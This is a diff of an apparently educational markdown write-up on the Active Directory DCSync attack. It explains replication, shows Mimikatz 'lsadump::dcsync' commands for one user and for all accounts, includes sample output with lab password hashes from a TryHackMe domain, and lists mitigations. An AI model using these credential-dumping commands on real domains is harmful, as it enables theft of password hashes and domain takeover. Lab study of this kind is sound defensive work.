@@ -1,46 +1,65 @@
-### What is DcSync
-DCSync is an attack that allows an adversary to simulate the behavior of a domain controller (DC) and retrieve password data via domain replication. It leverages Microsoft Directory Replication Service Remote Protocol Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to pretend to be a domain controller (DC) in order to get user credentials from another DC.
+### 1. AD Replication theory
+AD replication is the process of synchronizing all objects from one Domain Controller to another Domain Controller. By doing this, all the Domain Controllers in the same site and forests can have updated objects to perform authentication correctly.
 
-### How DcSync works
-1. The initial foothold must be against a domain account with domain replication privileges; the Directory Replication Service Remote Protocol (MS-DRSR); MS-DRSR is a legitimate Active Directory service that cannot be disabled.
-2. By default these privileges are limited to the: domain administrators, enterprise administrators, administrators, and domain controller groups. However, in certain cases, ordinary domain owners may have the needed permissions to launch a DCSync attack.Those roles have replication permissions that include the following rights that enable a DCSync attack: Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes In Filtered Set
-3. The attacker who compromised an account with adequate permissions would load Mimikatz and run the DCSync command from the lsadump module, specifying the targeted domain and user account—one example would be the KRBTGT account which is used to encrypt and sign Kerberos tickets within a domain. A domain controller would use this account to decrypt and validate those tickets, authenticating accounts to access network resources.
-4. The DCSync command in Mimikatz allows an attacker to pretend to be a domain controller and retrieve password hashes from other domain controllers, without executing any code on the target. It does so over the MS-DRSR protocol via the DSGetNCChanges method that replicates updates from a naming context (NC) replica on the server.
-5. In addition to the crucial NTLM password hash, earlier password hashes are also returned. An attacker who can compromise those, as well, may deduce patterns a particular user employs to set passwords and may be able to crack those offline.
-6. Those passwords may also be returned in cleartext through the use of the Powersploit tool, Microsoft PowerShell scripts that enable reverse encryption and allows an attacker access to the plaintext version of the secret.
+### 2. What is DcSync?
+DCSync is an attack based on AD replication that the adversary try to pretend as the Domain Controller to get data of all the objects, especially users' passwords and hashes. This technique is usually used for lateral movement like pass the hash or doing RDP login. Also, it can be used for persistence since attackers can use the gathered passwords to get a foothold on the domain all the time.
 
-With the KRBTGT NTLM password hash in hand (AES256, AES128 hashes also), an attacker can launch a Golden Ticket attack that allows an attacker to forge valid Kerberos Ticket Granting Tickets and access any resource on an Active Directory Domain.
+### 3. How DcSync works
+1. Adversary compromise accounts with high privilege that have the ability to perform AD replication. By default these privileges are limited to the: domain administrators, enterprise administrators, administrators, and domain controller groups.
+2. Attackers run mimikatz using the high privilege account to perform the Dcsync attacks using lsadump module. Because attackers have the credentials of the high privilege accounts, he can pretend to be the domain controller and perform DCSync
+3. After retrieving all the users hashes and passwords, attacks can attempt to transfer them to their machine and crack those hashes offline to retrieve the plaintext password for other attacks such as RDP login
 
-### DcSync with mimikatz
-Once the account is delegated the ability to replicate objects, the account can run Mimikatz DCSync:
+There are different ways that we can pretend to be high privilege account. One way is to create a forged Golden Ticket using KRBTGT account. This could help the adversary access all resources with no limitation
+
+### 4. DcSync with mimikatz
+Note: These commands run on lab environment of Tryhackme at https://tryhackme.com/room/persistingad
+Once the account that has permission to replicate objects, we can run Mimikatz DcSync. For example, we can try to dump the hashes of users aaron.jones
 
 ```powershell
-mimikatz “lsadump::dcsync /domain:uc.edu /user:krbtgt”
+mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:aaron.jones
+[DC] 'za.tryhackme.loc' will be the domain
+[DC] 'THMDC.za.tryhackme.loc' will be the DC server 
+[DC] 'aaron.jones' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : aaron.jones 
+
+** SAM ACCOUNT **
+
+SAM Username         : aaron.jones
+Account Type         : 30000000 ( USER_OBJECT )    
+User Account Control : 00000200 ( NORMAL_ACCOUNT ) 
+Account expiration   :
+Password last change : 4/25/2022 7:30:21 PM
+Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-1429 
+Object Relative ID   : 1429
+
+Credentials:
+  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc 
+    ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc 
+    lm  - 0: 0fd2685aa18c78bd265d02bdec203b04 
+
+[...]
+
+* Primary:WDigest * 
+    01  991d45386dd3561e0c5529d3605f96e6
+    02  d5d6f25b233c87b289706d7b423f1145
+[...]
 ```
-![Exploit DcSync](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-DCSync-UserRights-DCR-KRBTGT-Dump.jpg)
 
+We can also dump all the hashes of objects in the DC
 
-Targeting an admin account with DCSync can also provide the account’s password history (in hash format). Since there are LMHashes listed it may be possible to crack these and gain insight into the password strategy the admin uses. This may provide the attacker to guess the next password the admin uses if access is lost.
 ```powershell
-mimikatz “lsadump::dcsync /domain:uc.edu /user:Administrator”
+mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
 ```
-![history hash](https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-DCSync-UserRights-DCR-Administrator-500-Dump2-021.jpg)
 
-### DcSync attack result
-- DCSync attacks allow an attacker to impersonate a domain controller and request password hashes from other domain controllers
-- Only accounts that have certain replication permissions with Active Directory can be targeted and used in a DCSync attack.
-- DCSync attacks enable an attacker to target a domain controller without having to log on to or place code on the controller.
-- Monitoring network traffic, and controlling replication permissions, are the best strategies to combat DCSync attacks.
+### 5. Mitigations
+- Create strong password of Domain Admin accounts: this could make attacker an extra mile harder to crack the password
 
-### Mitigations
+- Monitor accounts with object replication permission: Monitoring accounts with permission to replicate can help the blue team to alert the incident if it happned from unsual IP of the activity
 
-- **Audit Domain Administrator and User Permissions**: Preventing DCSync attacks demands an understanding of which accounts have domain replication permissions. With that knowledge, security staff should determine whether those rights should be revoked or limited on any of those accounts. Given that these privileges are standard for domain administrators and domain controllers, consider strictly limiting access to these groups while also strengthening authentication requirements for all group members to make offline password cracking more difficult.
-
-- **Tighten Patching and Configuration Management**: Ensure basic security hygiene practices are followed including patch and configuration management, endpoint detection and response, and user awareness training. Basic security hygiene is the most reliable way to protect accounts from external attackers or malicious insiders.
-
-- **Enable Network Monitoring**: Network monitoring is the best detection method. First, as pointed out by expert Sean Metcalf, all domain controller IP addresses should be identified and then added to the Replication Allow List. Once that occurs, administrators should configure intrusion detection systems to alert when DSGetNCChange requests originate outside that list of IPs.
-
-### References
+### 6. References
 DcSync theory: https://www.qomplx.com/kerberos_dcsync_attacks_explained/
 
-DcSync exploit: https://adsecurity.org/?p=1729
+AD Replication theory: https://blog.netwrix.com/2017/02/20/active-directory-replication/
